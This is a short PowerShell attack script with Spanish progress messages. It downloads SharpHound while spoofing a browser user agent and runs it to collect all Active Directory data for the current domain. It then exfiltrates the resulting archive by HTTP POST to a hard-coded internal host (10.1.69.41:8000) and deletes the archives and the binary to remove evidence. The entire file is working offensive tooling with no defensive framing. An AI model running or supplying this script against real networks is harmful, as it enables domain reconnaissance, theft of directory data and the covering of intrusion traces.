Write-Host "=== BLOODHOUND DISCOVERY PHASE ===" -ForegroundColor Red

Write-Host "Creando directorio y descargando SharpHound..."
New-Item -ItemType Directory -Path "C:\\temp\\bloodhound" -Force; Set-Location "C:\\temp\\bloodhound"; Invoke-WebRequest -Uri "https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip" -OutFile "sharphound.zip" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

Write-Host "Extrayendo y ejecutando SharpHound..."
Expand-Archive -Path "sharphound.zip" -DestinationPath "." -Force; $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"; $domain = $env:USERDOMAIN; .\\SharpHound.exe -c All -d $domain --zipfilename "bloodhound_$timestamp.zip"

Write-Host "Esperando completar colección..."
Start-Sleep -Seconds 15

Write-Host "Exfiltrando datos de BloodHound..."
$exfilURL = "http://10.1.69.41:8000"; $bloodhoundFile = Get-ChildItem "bloodhound_*.zip" | Select-Object -First 1; $fileBytes = [System.IO.File]::ReadAllBytes($bloodhoundFile.FullName); Invoke-RestMethod -Uri $exfilURL -Method POST -Body $fileBytes -ContentType "application/zip" -Headers @{"X-Filename" = $bloodhoundFile.Name}

Write-Host "Limpiando evidencia..."
Remove-Item "*.zip" -Force; Remove-Item "SharpHound.exe" -Force

Write-Host "=== BLOODHOUND RECONNAISSANCE COMPLETED ===" -ForegroundColor Red